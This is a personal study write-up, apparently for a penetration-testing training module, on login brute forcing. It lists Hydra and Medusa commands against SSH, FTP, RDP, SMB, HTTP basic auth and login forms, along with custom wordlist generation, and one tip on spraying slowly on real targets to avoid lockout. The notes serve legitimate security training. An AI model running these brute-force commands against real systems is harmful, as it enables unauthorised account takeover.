# 16 — Login Brute Forcing

> **Path Phase:** Web Attacks | **Difficulty:** Easy | **Sections:** 13

Brute forcing login forms and services with Hydra and Medusa, plus building custom wordlists.

> ℹ️ `{TARGET}` = target. Creds/flags withheld per HTB Academy policy.

---

## Table of Contents
1. Introduction
2. Password Security Fundamentals
3. Brute Force Attacks
4. Dictionary Attacks
5. Hybrid Attacks
6. Hydra
7. Basic HTTP Authentication
8. Login Forms
9. Medusa
10. Web Services
11. Custom Wordlists
12. Skills Assessment Part 1
13. Skills Assessment Part 2

---

## 1–5 — Fundamentals & Attack Types
- **Brute force:** try every combination.
- **Dictionary:** try a wordlist.
- **Hybrid:** wordlist + mutations (rules).

## 6 — Hydra (core tool)
```bash
hydra -l admin -P rockyou.txt ssh://{TARGET}
hydra -L users.txt -P pass.txt ftp://{TARGET}
hydra -l admin -P pass.txt {TARGET} -s 8080 http-get /
```

## 7 — Basic HTTP Authentication
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt {TARGET} http-get /
```
> **Basic-auth creds:** ✅ Completed in lab (withheld per HTB Academy policy)

## 8 — Login Forms (http-post-form)
```bash
# Format: "path:body:failure_string"
hydra -L users.txt -P pass.txt {TARGET} http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
# For GET forms use http-get-form
```
> **Login-form creds:** ✅ Completed in lab (withheld per HTB Academy policy)

## 9 — Medusa
```bash
medusa -h {TARGET} -u admin -P rockyou.txt -M ssh
medusa -h {TARGET} -U users.txt -P pass.txt -M http -m DIR:/login
```

## 10 — Web Services
```bash
hydra -L users.txt -P pass.txt rdp://{TARGET}
hydra -L users.txt -P pass.txt smb://{TARGET}
```

## 11 — Custom Wordlists
```bash
./username-anarchy Jane Doe > users.txt
cewl http://{TARGET} -w site-words.txt
hashcat --stdout site-words.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
```

## 12–13 — Skills Assessment Part 1 & 2
```bash
./username-anarchy First Last > users.txt
cewl http://{TARGET} -w words.txt
hydra -L users.txt -P words.txt {TARGET} http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```
> **Part 1 & 2:** ✅ Completed in lab (answers withheld per HTB Academy policy)

---

## 🧰 Tools Used
| Tool | Purpose |
|------|---------|
| `hydra` | Multi-protocol brute forcing |
| `medusa` | Alternative brute forcer |
| `cewl` / `username-anarchy` | Custom wordlist generation |
| `hashcat --stdout` | Wordlist mutation |

## 🔑 Key Takeaways
- The **failure string** in `http-post-form` must be exact — test it in Burp first.
- Custom wordlists (cewl + rules) beat rockyou for targeted attacks.
- `username-anarchy` generates realistic username permutations.
- Watch for account lockout — spray slowly on real targets.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
